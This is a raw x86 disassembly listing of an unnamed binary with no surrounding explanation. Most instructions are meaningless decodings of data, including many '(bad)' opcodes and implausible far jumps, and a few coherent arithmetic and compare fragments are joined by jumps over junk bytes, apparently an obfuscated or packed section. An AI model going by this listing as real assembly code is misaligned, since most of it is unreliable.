  409aa6:	mov    DWORD PTR ds:0xea83b162,edx
  409aac:	pop    eax
  409aad:	retf   0xffbe
  409ab0:	sahf   
  409ab1:	sub    edx,DWORD PTR [edi]
  409ab3:	adc    DWORD PTR [edi-0x3d],ecx
  409ab6:	aam    0xf2
  409ab8:	xchg   edi,eax
  409ab9:	xchg   ebp,eax
  409aba:	inc    esi
  409abb:	mov    BYTE PTR [ecx-0x4ead5521],al
  409ac1:	in     eax,0x28
  409ac3:	retf   0x9642
  409ac6:	cld    
  409ac7:	iret   
  409ac8:	test   DWORD PTR [ebp-0x2fa90dea],0xa3c66af2
  409ad2:	xchg   esi,eax
  409ad3:	xlat   BYTE PTR ds:[ebx]
  409ad4:	mov    ds:0x3a4bd0cb,al
  409ad9:	mov    ebx,0xf5a634d
  409ade:	add    edx,ebp
  409ae0:	add    ch,BYTE PTR [eax-0x1c]
  409ae3:	cmp    ebp,DWORD PTR [eax+0x45]
  409ae6:	mov    ah,bh
  409ae8:	add    edi,DWORD PTR ds:0xb848de5b
  409aee:	ins    DWORD PTR es:[edi],dx
  409aef:	dec    esi
  409af0:	aam    0xad
  409af2:	ins    DWORD PTR es:[edi],dx
  409af3:	js     0x409b5f
  409af5:	out    0xa2,eax
  409af7:	add    ebx,0xe
  409afa:	into   
  409afb:	jnp    0x409b15
  409afd:	adc    eax,0x94134d2d
  409b02:	cld    
  409b03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b04:	out    dx,eax
  409b05:	sub    BYTE PTR [eax-0x1c],dh
  409b08:	lahf   
  409b09:	fst    DWORD PTR [ebp+0x79]
  409b0c:	rcl    BYTE PTR ds:0x8aa6ec7b,cl
  409b12:	mov    esp,0x99925aa3
  409b17:	(bad)  
  409b18:	mov    al,ds:0x986bc75b
  409b1d:	and    ch,bl
  409b1f:	int3   
  409b20:	mov    edx,0xc89ca3bb
  409b25:	pop    edx
  409b26:	test   DWORD PTR [di],esp
  409b29:	inc    esi
  409b2a:	lock nop
  409b2c:	daa    
  409b2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b2e:	es dec ebx
  409b30:	shl    esp,0xb6
  409b33:	int3   
  409b34:	xor    bh,dh
  409b36:	std    
  409b37:	jbe    0x409b66
  409b39:	test   al,0x77
  409b3b:	dec    esi
  409b3c:	mov    al,0x34
  409b3e:	fdiv   QWORD PTR [ebx]
  409b40:	shr    ecx,cl
  409b42:	rol    DWORD PTR [eax],cl
  409b44:	add    BYTE PTR [eax],al
  409b46:	call   0x6418fd16
  409b4b:	cli    
  409b4c:	stc    
  409b4d:	sti    
  409b4e:	push   ebx
  409b4f:	jecxz  0x409bc4
  409b51:	add    dl,bh
  409b53:	xchg   DWORD PTR [esi+0x5fb133],esp
  409b59:	add    BYTE PTR [ebx+0x29000000],bh
  409b5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b60:	(bad)  
  409b61:	xchg   ecx,eax
  409b62:	or     eax,0x5e68bbac
  409b67:	call   0xf274bba1
  409b6c:	cmp    eax,0xd226325a
  409b71:	inc    DWORD PTR [ebp-0x26]
  409b74:	sar    DWORD PTR [ebx],1
  409b76:	imul   ecx,ecx,0xffffffa8
  409b79:	mov    ebp,0x8294194c
  409b7e:	dec    eax
  409b7f:	xchg   edx,eax
  409b80:	xor    esi,0x6b5880c1
  409b86:	cmp    BYTE PTR [ebx],0xd5
  409b89:	xchg   esp,eax
  409b8a:	loop   0x409b52
  409b8c:	(bad)
  409b8f:	clc    
  409b90:	sbb    DWORD PTR [ecx-0x64],eax
  409b93:	xchg   ecx,eax
  409b94:	inc    esi
  409b95:	pop    ds
  409b96:	popa   
  409b97:	dec    ecx
  409b98:	inc    ebp
  409b99:	cli    
  409b9a:	test   bl,bl
  409b9c:	sahf   
  409b9d:	inc    ebp
  409b9e:	mov    ds:0xba38110f,al
  409ba3:	popf   
  409ba4:	pusha  
  409ba5:	xchg   ebp,eax
  409ba6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ba7:	test   eax,0x8ac0e4b7
  409bac:	and    ebp,DWORD PTR [eax]
  409bae:	mov    ah,0xa8
  409bb0:	cmp    esi,0x54
  409bb3:	lds    ecx,FWORD PTR [ebp-0x6ab25737]
  409bb9:	ja     0x409c32
  409bbb:	adc    eax,0xd535a6c6
  409bc0:	lods   eax,DWORD PTR ds:[esi]
  409bc1:	sbb    al,0x13
  409bc3:	mov    esp,0x99e35ffa
  409bc8:	jecxz  0x409b9c
  409bca:	lahf   
  409bcb:	cmp    esi,ecx
  409bcd:	add    al,0x76
  409bcf:	adc    ah,cl
  409bd1:	ds mov al,0x7
  409bd4:	call   FWORD PTR [edx+0x23704b5f]
  409bda:	gs ins BYTE PTR es:[edi],dx
  409bdc:	jge    0x409baf
  409bde:	sub    BYTE PTR [eax-0x7a133bc9],ch
  409be4:	loope  0x409bc9
  409be6:	fcom   DWORD PTR [edx+0x47c8aebf]
  409bec:	inc    ecx
  409bed:	ficom  DWORD PTR [edi]
  409bef:	jbe    0x409c03
  409bf1:	pop    ebx
  409bf2:	popf   
  409bf3:	lea    ecx,[edi-0x7082b734]
  409bf9:	outs   dx,DWORD PTR ds:[esi]
  409bfa:	stos   BYTE PTR es:[edi],al
  409bfb:	popf   
  409bfc:	adc    eax,0x9c4f02cb
  409c01:	or     eax,0xfa89363e
  409c06:	xor    edi,DWORD PTR [eax+0x40dac9be]
  409c0c:	mov    ecx,0x83c11fb3
  409c11:	and    al,0x9e
  409c13:	xchg   edi,eax
  409c14:	rcr    BYTE PTR [ecx+eiz*1-0x39cc8420],1
  409c1b:	jmp    0x409cf3
  409c20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c21:	xchg   edx,eax
  409c22:	leave  
  409c23:	imul   edi,ebp,0xc4dfa67b
  409c29:	cmp    BYTE PTR [eax-0x5ecb41c7],bl
  409c2f:	mov    eax,ds:0x606c
  409c34:	mov    ebx,0xf1000000
  409c39:	mov    eax,ds:0x51144c8c
  409c3e:	inc    eax
  409c3f:	inc    edi
  409c40:	or     BYTE PTR [edx+ebp*4],0x6e
  409c44:	mov    eax,0x5645ce34
  409c49:	pop    eax
  409c4a:	int3   
  409c4b:	(bad)  
  409c4d:	adc    BYTE PTR [esi-0x46],0xa1
  409c51:	pusha  
  409c52:	dec    esp
  409c53:	mov    ah,0xb3
  409c55:	jnp    0x409c8e
  409c57:	(bad)
  409c5a:	xor    dh,BYTE PTR [edi]
  409c5c:	out    0x3b,eax
  409c5e:	nop
  409c5f:	or     al,0x55
  409c61:	stos   BYTE PTR es:[edi],al
  409c62:	push   ss
  409c63:	and    dl,ch
  409c65:	outs   dx,DWORD PTR ds:[esi]
  409c66:	in     eax,0x1e
  409c68:	xor    al,0x75
  409c6a:	push   esi
  409c6b:	scas   eax,DWORD PTR es:[edi]
  409c6c:	rcl    DWORD PTR [ebx-0x2f],1
  409c6f:	clc    
  409c70:	adc    BYTE PTR [eax+0x4a927362],0x6b
  409c77:	dec    edx
  409c78:	and    DWORD PTR [ebx],esi
  409c7a:	sbb    BYTE PTR [ecx+0x5d60d303],al
  409c80:	cli    
  409c81:	scas   eax,DWORD PTR es:[edi]
  409c82:	pushf  
  409c83:	jbe    0x409c47
  409c85:	scas   al,BYTE PTR es:[edi]
  409c86:	mov    ds:0x692dc70c,eax
  409c8b:	(bad)  [ecx+0x3c9d29b0]
  409c91:	js     0x409c98
  409c93:	push   edi
  409c94:	ds pusha 
  409c96:	mov    dh,BYTE PTR [eax-0x71]
  409c99:	mov    ecx,0x3f3f3d4e
  409c9e:	or     BYTE PTR [edi-0x23],ah
  409ca1:	sbb    DWORD PTR [eax-0x33],eax
  409ca4:	cmp    eax,0x8a63f7a3
  409ca9:	lds    eax,FWORD PTR [edx+ebx*8+0x16]
  409cad:	sbb    ah,ch
  409caf:	stc    
  409cb0:	xor    DWORD PTR [esi],edx
  409cb2:	jmp    0x848d:0x289a3f37
  409cb9:	test   DWORD PTR [eax],ecx
  409cbb:	dec    ebx
  409cbc:	and    al,0xc5
  409cbe:	xlat   BYTE PTR ds:[ebx]
  409cbf:	stc    
  409cc0:	test   DWORD PTR [ebp-0x64396413],ebp
  409cc6:	pop    edx
  409cc7:	aad    0xdb
  409cc9:	cmp    edi,DWORD PTR [eax+edi*1-0x49]
  409ccd:	pop    ecx
  409cce:	sub    DWORD PTR [ebx],edx
  409cd0:	jb     0x409cd5
  409cd2:	ss push 0x29
  409cd5:	pop    edi
  409cd6:	mov    dh,0xa9
  409cd8:	test   BYTE PTR [ecx-0x6d6473c5],bh
  409cde:	jecxz  0x409cc2
  409ce0:	xchg   edx,eax
  409ce1:	lods   al,BYTE PTR ds:[esi]
  409ce2:	aas    
  409ce3:	shr    DWORD PTR [esi-0x10],cl
  409ce6:	push   ecx
  409ce7:	ins    BYTE PTR es:[edi],dx
  409ce8:	ja     0x409d07
  409cea:	or     eax,0x80904a99
  409cef:	ret    0x712
  409cf2:	add    DWORD PTR ds:0x99b8624d,eax
  409cf8:	adc    edx,0x8ddc
  409cfe:	jmp    0x409dd6
  409d03:	adc    dl,BYTE PTR [edx]
  409d05:	ret    0xc2c7
  409d08:	xlat   BYTE PTR ds:[ebx]
  409d09:	pop    ss
  409d0a:	xlat   BYTE PTR ds:[ebx]
  409d0b:	jl     0x409d58
  409d0d:	stos   BYTE PTR es:[edi],al
  409d0e:	in     al,0x98
  409d10:	out    0xfb,al
  409d12:	cmp    BYTE PTR [edi],ah
  409d14:	popa   
  409d15:	add    BYTE PTR [eax],al
  409d17:	mov    ebx,0x59000000
  409d1c:	inc    ebp
  409d1d:	outs   dx,BYTE PTR ds:[esi]
  409d1e:	xchg   ebp,eax
  409d1f:	(bad)
  409d24:	add    al,0xb
  409d26:	ja     0x409d70
  409d28:	popf   
  409d29:	lea    edi,[eax-0x2e]
  409d2c:	mov    ebx,0xf4a21ba3
  409d31:	stos   DWORD PTR es:[edi],eax
  409d32:	bound  ecx,QWORD PTR [eax-0x765ca4c8]
  409d38:	popa   
  409d39:	es lahf 
  409d3b:	(bad)  
  409d3c:	jp     0x409ce2
  409d3e:	clc    
  409d3f:	pop    ebx
  409d40:	js     0x409dba
  409d42:	xchg   edx,edi
  409d44:	mov    ds:0xcaa82570,eax
  409d49:	ret    0x6a4c
  409d4c:	outs   dx,BYTE PTR ds:[esi]
  409d4d:	add    eax,0x3573488d
  409d52:	sub    eax,0xde96fe5e
  409d57:	aas    
  409d58:	arpl   WORD PTR [ebx],bp
  409d5a:	test   BYTE PTR [ecx+0x122f4393],al
  409d60:	mov    BYTE PTR [ecx-0x3],ah
  409d63:	sub    bh,dh
  409d65:	outs   dx,BYTE PTR ds:[esi]
  409d66:	fnstcw WORD PTR [eax]
  409d68:	or     BYTE PTR [edx],ch
  409d6a:	dec    edx
  409d6b:	inc    ecx
  409d6c:	nop
  409d6d:	xor    dl,BYTE PTR ds:0xfff94c3e
  409d73:	mov    cl,0xb9
  409d75:	ins    BYTE PTR es:[edi],dx
  409d76:	mov    dl,0x70
  409d78:	inc    eax
  409d79:	mov    ?,esp
  409d7b:	repnz (bad) 
  409d7d:	rcr    al,1
  409d7f:	loop   0x409d11
  409d81:	and    esp,DWORD PTR [esi]
  409d83:	xor    BYTE PTR [esi+0x5ff7d471],bh
  409d89:	mov    al,ds:0x1eb4cc99
  409d8e:	jle    0x409d40
  409d90:	lock aam 0x92
  409d93:	or     DWORD PTR [eax+edx*4],ecx
  409d96:	sub    BYTE PTR [esi-0x5c617446],bl
  409d9c:	xchg   edx,eax
  409d9d:	call   0xb05e:0x8ac0a1e0
  409da4:	or     edx,esp
  409da6:	inc    esp
  409da7:	aas    
  409da8:	inc    edx
  409da9:	sti    
  409daa:	mov    dh,0x7a
  409dac:	xchg   ebx,eax
  409dad:	or     BYTE PTR [edx],cl
  409daf:	mov    BYTE PTR [ebp+0x71],ch
  409db2:	cmp    al,0x31
  409db4:	dec    esp
  409db5:	mov    ?,WORD PTR [ebp-0x530e484]
  409dbb:	cmp    ch,BYTE PTR [ecx+0x6b]
  409dbe:	xchg   esp,eax
  409dbf:	mov    ecx,0x46290b98
  409dc4:	adc    al,0xbd
  409dc6:	outs   dx,DWORD PTR ds:[esi]
  409dc7:	lsl    eax,cx
  409dca:	out    dx,al
  409dcb:	jns    0x409d54
  409dcd:	hlt    
  409dce:	das    
  409dcf:	and    eax,0x73b3a5bd
  409dd4:	xor    BYTE PTR [ebx],0x89
  409dd7:	inc    ebp
  409dd8:	or     cl,ch
  409dda:	rol    DWORD PTR [eax],cl
  409ddc:	add    BYTE PTR [eax],al
  409dde:	nop
  409ddf:	stos   BYTE PTR es:[edi],al
  409de0:	mov    edi,0x913fbf3e
  409de5:	scas   al,BYTE PTR es:[edi]
  409de6:	lds    ecx,FWORD PTR [ebp-0x2d]
  409de9:	or     eax,0xda2ca92f
  409dee:	loop   0x409e51
  409df0:	add    BYTE PTR [eax],al
  409df2:	mov    ebx,0x54000000
  409df7:	ja     0x409e50
  409df9:	retf   0x832f
  409dfc:	popf   
  409dfd:	mov    edx,0x56906768
  409e02:	and    BYTE PTR [eax-0x7a477bff],dh
  409e08:	sub    al,0xdb
  409e0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e0b:	and    cl,dh
  409e0d:	jl     0x409d91
  409e0f:	pop    eax
  409e10:	push   0x47e4ae11
  409e15:	add    edi,ecx
  409e17:	or     dl,bh
  409e19:	ds ror eax,cl
  409e1c:	jo     0x409e0e
  409e1e:	xchg   edx,eax
  409e1f:	pushf  
  409e20:	mov    bh,0xe4
  409e22:	pop    esi
  409e23:	mov    edi,0xe892ccbb
  409e28:	ror    BYTE PTR [edi+0x67],1
  409e2b:	push   ss
  409e2c:	ins    DWORD PTR es:[edi],dx
  409e2d:	pop    edx
  409e2e:	or     DWORD PTR [edx+0x78],esi
  409e31:	push   esp
  409e32:	pop    ebp
  409e33:	sbb    dh,bl
  409e35:	mov    es,eax
  409e37:	push   eax
  409e38:	dec    ebp
  409e39:	lea    ebp,[eiz*2-0x3ff9eb7b]
  409e40:	cld    
  409e41:	xor    eax,0x67303d52
  409e46:	loopne 0x409dff
  409e48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e49:	inc    eax
  409e4a:	xchg   esp,eax
  409e4b:	fist   WORD PTR [eax+0x3f25ace0]
  409e51:	inc    edi
  409e52:	lea    ebp,[ecx+0x16]
  409e55:	jecxz  0x409e17
  409e57:	adc    eax,0x82f36648
  409e5c:	ins    DWORD PTR es:[edi],dx
  409e5d:	or     eax,0xd65bcc5a
  409e62:	cli    
  409e63:	fimul  DWORD PTR [ecx]
  409e65:	test   BYTE PTR [esi+0x33],cl
  409e68:	add    bh,BYTE PTR [esi-0x1c144b7e]
  409e6e:	add    BYTE PTR [edi+ebp*4-0x581f0c2b],0x12
  409e76:	pop    ebx
  409e77:	mov    ecx,0xdbcf0c45
  409e7c:	add    bl,dh
  409e7e:	outs   dx,BYTE PTR ds:[esi]
  409e7f:	or     BYTE PTR [edx-0x649a080e],ah
  409e85:	mov    bl,0xd4
  409e87:	sti    
  409e88:	in     al,dx
  409e89:	ds std 
  409e8b:	rcr    DWORD PTR [esi+eax*8+0x1d],0x73
  409e90:	idiv   DWORD PTR [ebp+0x3c]
  409e93:	mov    cs,WORD PTR ds:0x484db553
  409e99:	shr    DWORD PTR [esi-0x81f5ac4],1
  409e9f:	lock dec ebx
  409ea1:	loopne 0x409ef9
  409ea3:	cmp    eax,0x6284dead
  409ea8:	add    dl,dl
  409eaa:	das    
  409eab:	jmp    0x591f5330
  409eb0:	xchg   ecx,eax
  409eb1:	mov    eax,DWORD PTR [ecx]
  409eb3:	jmp    0x409f8b
  409eb8:	mov    BYTE PTR [ebx+0x38],bl
  409ebb:	jne    0x409eb8
  409ebd:	ja     0x409e8c
  409ebf:	call   FWORD PTR [ebx-0x5f]
  409ec2:	(bad)  [ebp+0x6a]
  409ec5:	lock and bl,dh
  409ec8:	popf   
  409ec9:	bound  eax,QWORD PTR [eax]
  409ecb:	add    BYTE PTR [ebx+0x58000000],bh
  409ed1:	ret    
  409ed2:	out    dx,eax
  409ed3:	pop    esp
  409ed4:	pop    ebx
  409ed5:	fcmovbe st,st(6)
  409ed7:	pop    ebx
  409ed8:	lods   eax,DWORD PTR ds:[esi]
  409ed9:	mov    ds:0x11899f76,eax
  409ede:	push   ebx
  409edf:	xchg   esp,eax
  409ee0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ee1:	dec    edi
  409ee2:	pusha  
  409ee3:	mov    ecx,0xd5e82cb
  409ee8:	push   0x7faf5f14
  409eed:	call   FWORD PTR [ebp-0x20]
  409ef0:	jbe    0x409e8d
  409ef2:	push   ecx
  409ef3:	fnstsw WORD PTR [edi]
  409ef5:	push   eax
  409ef6:	sbb    al,0x91
  409ef8:	cdq    
  409ef9:	and    eax,DWORD PTR [ecx-0x8c428d0]
  409eff:	add    al,0x64
  409f01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f02:	pop    ds
  409f03:	cwde   
  409f04:	and    BYTE PTR [ebp+0x26a4d7f3],ch
  409f0a:	sub    eax,ecx
  409f0c:	add    eax,0xe8d4bf09
  409f11:	add    esp,edi
  409f13:	ss cld 
  409f15:	pop    ecx
  409f16:	dec    edx
  409f17:	inc    ecx
  409f18:	mov    esi,DWORD PTR [ebx]
  409f1a:	inc    esi
  409f1b:	pop    ecx
  409f1c:	add    al,0x24
  409f1e:	hlt    
  409f1f:	cmovb  ebx,ebp
  409f22:	mov    ds:0xd0bd426b,eax
  409f27:	call   0x8eff4e7d
  409f2c:	fld    st(4)
  409f2e:	mov    ch,0xd5
  409f30:	xchg   BYTE PTR [edi-0x33e15316],ah
  409f36:	(bad)  
  409f37:	sbb    bh,BYTE PTR [ebx-0x22e80768]
  409f3d:	xchg   BYTE PTR [eax],ah
  409f3f:	jmp    0xb646cd3c
  409f44:	and    al,BYTE PTR [ebx+0xf]
  409f47:	ja     0x409fc6
  409f49:	pop    esp
  409f4a:	add    ch,BYTE PTR [esi-0x17]
  409f4d:	bound  eax,QWORD PTR [edi+0x76]
  409f50:	mov    al,ds:0x16b2e1d1
  409f55:	cs test dl,cl
  409f58:	add    eax,0x1f6600b9
  409f5d:	xor    BYTE PTR [ebp+0x3d],cl
  409f60:	push   eax
  409f61:	imul   edx,DWORD PTR [edi],0xf31aa070
  409f67:	fimul  WORD PTR [ecx+0x3dfd7903]
  409f6d:	(bad)
  409f70:	adc    DWORD PTR [ebx+0x1f2a511d],0xffffffae
  409f77:	mov    ds:0xeb84ca22,al
  409f7c:	sbb    al,0x1f
  409f7e:	ret    0x8ff7
  409f81:	add    bh,BYTE PTR [eax+0x6b3514cc]
  409f87:	cdq    
  409f88:	xor    eax,0x55897774
  409f8d:	or     al,0x8b
  409f8f:	push   ecx
  409f90:	add    al,0x33
  409f92:	(bad)  
  409f93:	xor    edx,ebx
  409f95:	add    eax,0x99b8624d
  409f9a:	adc    edx,0x8ddc
  409fa0:	mov    DWORD PTR [ebp+0x1c],edx
  409fa3:	cmp    DWORD PTR [ebp+0x8],eax
  409fa6:	jne    0x40ab43
  409fac:	mov    eax,edx
  409fae:	cmp    DWORD PTR [ebp+0xc],eax
  409fb1:	jne    0x40ab43
  409fb7:	jmp    0x40a35b
  409fbc:	mov    eax,DWORD PTR [edi]
  409fbe:	mov    edx,DWORD PTR [edi+0x4]
  409fc1:	jmp    0x40a099
  409fc6:	pop    eax
  409fc8:	push   ebx
  409fc9:	out    dx,al
  409fca:	pop    edi
  409fcb:	(bad)  
  409fcc:	mov    edi,0x928a79e1
  409fd1:	mov    eax,ds:0xbca14b75
  409fd6:	pop    eax
  409fd7:	arpl   WORD PTR [eax],ax
  409fd9:	add    BYTE PTR [ebx-0x3e000000],bh
  409fdf:	sub    eax,0xc19eb86e
  409fe4:	sub    eax,0xf85bd9a5
  409fe9:	jns    0x40a060
  409feb:	arpl   WORD PTR [ebp-0x63],cx
  409fee:	cmp    al,0x5a
  409ff0:	xor    al,0x27
  409ff2:	and    eax,eax
  409ff4:	jl     0x409fe8
  409ff6:	xchg   esi,eax
  409ff7:	add    al,0xc2
  409ff9:	not    ebp
  409ffb:	mov    cl,0x3a
  409ffd:	push   es
  409ffe:	loope  0x409fa4
  40a000:	inc    edi
  40a001:	and    edi,esp
  40a003:	pop    ss
  40a004:	pop    ss
  40a005:	sbb    al,0x89
  40a007:	jo     0x40a069
  40a009:	std    
  40a00a:	inc    esp
  40a00b:	push   ecx
  40a00c:	jmp    0xa54ae947
  40a011:	push   eax
  40a012:	mov    ebp,0x218d4d23
  40a017:	clc    
  40a018:	fwait
  40a019:	sbb    BYTE PTR [esi+0x68],dh
  40a01c:	aad    0x68
  40a01e:	mov    DWORD PTR [ecx-0x1f5bcc6e],ebx
  40a024:	xor    cl,BYTE PTR [ebp+0x7c95652c]
  40a02a:	xchg   esp,eax
  40a02b:	or     eax,0x62053019
  40a030:	mov    al,0xd8
  40a032:	xor    DWORD PTR [esi-0x70],0xfffffff7
  40a036:	fmul   st(2),st
  40a038:	fcomp  st(3)
  40a03a:	pop    edx
  40a03b:	test   DWORD PTR [ecx],0xd2d34705
  40a041:	popf   
  40a042:	jns    0x40a090
  40a044:	daa    
  40a045:	mov    bh,0x20
  40a047:	pop    ss
  40a048:	jp     0x40a051
  40a04a:	xor    edi,DWORD PTR [esi-0xb25e6ad]
  40a050:	push   0xffffff8f
  40a052:	fidivr WORD PTR ds:0xc969fc1e
  40a058:	iret   
  40a059:	push   ecx
  40a05a:	mov    edi,0x1341602a
  40a05f:	or     DWORD PTR [edi],ecx
  40a061:	push   es
  40a062:	push   ebx
  40a063:	jmp    0xf25c:0x57593f1f
  40a06a:	popf   
  40a06b:	sub    ebp,DWORD PTR [ecx+0x3aa6d555]
  40a071:	push   cs
  40a072:	sar    bh,1
  40a074:	pop    ebx
  40a075:	mov    dl,0x56
  40a077:	mul    BYTE PTR [ebp*2+0x407430de]
  40a07e:	out    0xe5,eax
  40a080:	ret    0xd191
  40a083:	(bad)  
  40a084:	sub    dh,bl
  40a086:	nop
  40a087:	cli    
  40a088:	cli    
  40a089:	ret    
  40a08a:	ror    BYTE PTR [edi],0xec
  40a08d:	xor    BYTE PTR [ebx],dl
  40a08f:	cld    
  40a090:	sub    eax,0xc7370e39
  40a095:	mov    al,BYTE PTR [eax-0x39cc8992]
  40a09b:	xor    edx,ebx
  40a09d:	add    eax,0x99b8624d
  40a0a2:	mov    DWORD PTR [ebp+0x8],eax
  40a0a5:	mov    eax,edx
  40a0a7:	mov    edx,DWORD PTR [ecx]
  40a0a9:	mov    ecx,DWORD PTR [ecx+0x4]
  40a0ac:	adc    eax,0x8ddc
  40a0b1:	push   eax
  40a0b2:	jmp    0x40a18a
  40a0b7:	cmp    dh,BYTE PTR ds:0xf3af62a4
  40a0bd:	(bad)  
  40a0be:	jge    0x40a0f6
  40a0c0:	ror    BYTE PTR [eax],1
  40a0c2:	xor    ecx,ebp
  40a0c4:	dec    edi
  40a0c5:	jl     0x40a137
  40a0c7:	adc    esp,DWORD PTR [eax+eax*1+0x0]
  40a0cb:	mov    ebx,0x9b000000
  40a0d0:	xchg   esp,eax
  40a0d1:	mov    dl,0x6c
  40a0d3:	mov    bh,0xe1
  40a0d5:	dec    esi
  40a0d6:	mov    bh,0x9d
  40a0d9:	push   ebp
  40a0da:	shl    al,1
  40a0dc:	lea    esp,[ebp-0x22]
  40a0df:	shl    DWORD PTR [edi-0x736d37be],0x41
  40a0e6:	(bad)  
  40a0e7:	xor    eax,0x4d9c5673
  40a0ec:	push   0x31
  40a0ee:	xchg   ebx,eax
  40a0ef:	jno    0x40a0e8
  40a0f1:	inc    ebx
  40a0f2:	imul   ebx,DWORD PTR [edx+edi*2+0x6b],0x6f
  40a0f7:	mov    DWORD PTR [ecx],esp
  40a0f9:	mov    ?,eax
  40a0fb:	jge    0x40a125
  40a0fd:	mov    DWORD PTR [ebp-0x3205f222],edx
  40a103:	mov    al,0x37
  40a105:	pop    edx
  40a106:	sub    bl,BYTE PTR [esi-0x26]
  40a109:	mov    ebx,0x13071ee3
  40a10e:	and    ch,bh
  40a110:	xchg   ebx,eax
  40a111:	int    0x92
  40a113:	stc    
  40a114:	pop    ds
  40a115:	fwait
  40a116:	xor    al,0x5f
  40a118:	xor    ch,BYTE PTR [eax-0x1a9e6a23]
  40a11e:	aas    
  40a11f:	push   eax
  40a120:	or     edi,DWORD PTR [eax]
  40a122:	adc    ebp,DWORD PTR [edx]
  40a124:	out    0xff,eax
  40a126:	ret    
  40a127:	bound  edx,QWORD PTR [esi]
  40a129:	imul   esp,DWORD PTR [eax],0xe9340c1a
  40a12f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a130:	dec    esp
  40a131:	cs jae 0x40a10c
  40a134:	sti    
  40a135:	lds    esi,FWORD PTR [ecx-0x6]
  40a138:	mov    bl,BYTE PTR [edx-0x2cdc4b41]
  40a13e:	jo     0x40a123
  40a140:	xchg   ecx,eax
  40a141:	shr    edx,0x56
  40a144:	mov    ds:0x1845c8dd,al
  40a149:	sbb    eax,0x51165c5a
  40a14e:	and    DWORD PTR [edx],edx
  40a150:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a151:	push   ds
  40a152:	or     bh,BYTE PTR [esi-0x3c]
  40a155:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a156:	(bad)  
  40a157:	pusha  
  40a158:	xchg   ch,al
  40a15a:	hlt    
  40a15b:	gs lahf 
  40a15d:	push   edx
  40a15e:	pop    ebp
  40a15f:	imul   ebp,DWORD PTR [edx-0x5c],0xffffff86
  40a163:	push   eax
  40a164:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a166:	cwde   
  40a167:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a169:	push   ss
  40a16a:	rcr    BYTE PTR [edx],1
  40a16c:	xor    esp,DWORD PTR [edx]
  40a16e:	inc    eax
  40a16f:	jmp    0x7f3aa1d7
  40a174:	mov    ds:0xad203c06,eax
  40a179:	jl     0x40a145
  40a17b:	dec    ebp
  40a17c:	stos   DWORD PTR es:[edi],eax
  40a17d:	push   edx
  40a17e:	lods   eax,DWORD PTR ds:[esi]
  40a17f:	arpl   WORD PTR [edi-0x69da249d],ax
  40a185:	add    ch,al
  40a187:	cmp    BYTE PTR [eax],bh
  40a189:	pusha  
  40a18a:	push   DWORD PTR [ebp+0x8]
  40a18d:	push   ecx
  40a18e:	push   edx
  40a18f:	call   0x42a3cf
  40a194:	jmp    0x40a26c
  40a199:	lods   al,BYTE PTR ds:[esi]
  40a19a:	xchg   edi,eax
  40a19b:	int    0x96
  40a19d:	(bad)  
  40a19e:	fdivp  st(7),st
  40a1a0:	mov    edi,0xe47d9b3d
  40a1a5:	sahf   
  40a1a6:	shr    DWORD PTR [ebp+0x64ce67],cl
  40a1ac:	add    BYTE PTR [ebx-0x24000000],bh
  40a1b2:	dec    ebp
  40a1b3:	clc    
  40a1b4:	mov    dl,0x5b
  40a1b6:	sbb    BYTE PTR ds:0x35361d5,dh
  40a1bc:	cmp    DWORD PTR [esi-0x77],ebx
  40a1bf:	sub    BYTE PTR ds:0x6ad00d95,0xc5
  40a1c6:	cld    
  40a1c7:	xor    dl,BYTE PTR ds:0x7b0647f2
  40a1cd:	push   eax
  40a1ce:	lods   eax,DWORD PTR ds:[esi]
  40a1cf:	or     dl,BYTE PTR [esi-0x51]
  40a1d2:	push   es
  40a1d3:	sbb    al,0x39
  40a1d5:	mov    ?,WORD PTR [ebx]
  40a1d7:	inc    ebx
  40a1d8:	jle    0x40a17b
  40a1da:	out    0xd,al
  40a1dc:	popa   
  40a1dd:	inc    esi
  40a1de:	out    dx,eax
  40a1df:	xor    eax,0xaf4cfdd3
  40a1e4:	jbe    0x40a23e
  40a1e6:	not    BYTE PTR [ebp+eiz*8+0x1ac29542]
  40a1ed:	daa    
  40a1ee:	add    bl,al
  40a1f0:	mov    edi,0xcced8c8d
  40a1f5:	push   esi
  40a1f6:	rcl    BYTE PTR [ebx-0x56c716a0],1
  40a1fc:	jmp    0xd7d43ca1
  40a201:	dec    edi
  40a202:	loopne 0x40a1c1
  40a204:	int3   
  40a205:	mov    ds:0xc21ed127,eax
  40a20a:	adc    al,dl
  40a20c:	mov    al,0x33
  40a20e:	les    ebp,FWORD PTR [eax+ebx*8-0x60b394c9]
  40a215:	mov    ebx,0x16ccb344
  40a21b:	push   edx
  40a21c:	in     eax,dx
  40a21d:	inc    edx
  40a21e:	pop    edx
  40a21f:	in     al,0xd6
  40a221:	inc    edi
  40a222:	scas   al,BYTE PTR es:[edi]
  40a223:	pop    eax
  40a224:	icebp  
  40a225:	addr16 lock dec ebx
  40a228:	mov    edi,0x812fba30
  40a22d:	inc    edx
  40a22e:	dec    ebx
  40a22f:	and    ebx,DWORD PTR [ebx-0x5f]
  40a232:	(bad)  
  40a233:	scas   al,BYTE PTR es:[edi]
  40a234:	stc    
  40a235:	test   dl,al
  40a237:	inc    esi
  40a238:	inc    edi
  40a239:	das    
  40a23a:	dec    ecx
  40a23b:	and    ebx,DWORD PTR [ebx+0x4d]
  40a23e:	mov    dl,0x4b
  40a240:	xchg   edx,eax
  40a241:	adc    esi,DWORD PTR [eax-0xa]
  40a244:	xchg   ecx,eax
  40a245:	pop    esp
  40a246:	sahf   
  40a247:	sar    BYTE PTR [eax-0x27],0x7b
  40a24b:	push   ebx
  40a24c:	adc    edx,edx
  40a24e:	add    al,0x0
  40a250:	xchg   esi,eax
  40a251:	loopne 0x40a290
